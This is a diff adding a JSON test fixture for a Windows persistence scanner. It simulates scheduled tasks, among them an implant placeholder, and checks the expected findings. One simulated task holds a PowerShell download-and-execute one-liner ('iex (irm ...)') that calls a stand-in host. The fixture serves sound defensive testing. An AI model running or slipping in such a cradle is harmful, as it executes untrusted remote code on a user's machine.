@@ -1,0 +1,39 @@
+{
+  "why": "Windows ships hundreds of scheduled tasks under \\Microsoft\\, many of which run PowerShell, and listing them for review buries the one that matters. They are not listed. They are still checked: a task named for the implant is confirmed wherever it sits, because registering under \\Microsoft\\ is otherwise all an implant has to do. A task of the operator's own that pipes a download into PowerShell is review.",
+  "roots": [
+    "code"
+  ],
+  "files": {
+    "code/proj/src/index.js": "export const hello = () => 'world'\n"
+  },
+  "home": {},
+  "host": {
+    "platform": "windows\n",
+    "processes": "",
+    "connections": "",
+    "git-config": "",
+    "root/.keep": "",
+    "run-keys": "",
+    "scheduled-tasks": "\\Microsoft\\Windows\\UpdateOrchestrator\\\tSchedule Scan\tpowershell.exe -File http-check.ps1\n\\Microsoft\\Windows\\\t{{IMPLANT}}\tC:\\ProgramData\\svc.exe\n\\\tNightly\tpowershell -c iex (irm http://example.test/a)\n"
+  },
+  "expect": {
+    "exit": 2,
+    "findings": [
+      {
+        "level": "HIT",
+        "match": "implant scheduled task registered"
+      },
+      {
+        "level": "review",
+        "match": "scheduled task runs a network or interpreter command",
+        "path": "Nightly"
+      }
+    ],
+    "must_print": [
+      "Unregister-ScheduledTask"
+    ],
+    "must_not_report": [
+      "Schedule Scan"
+    ]
+  }
+}
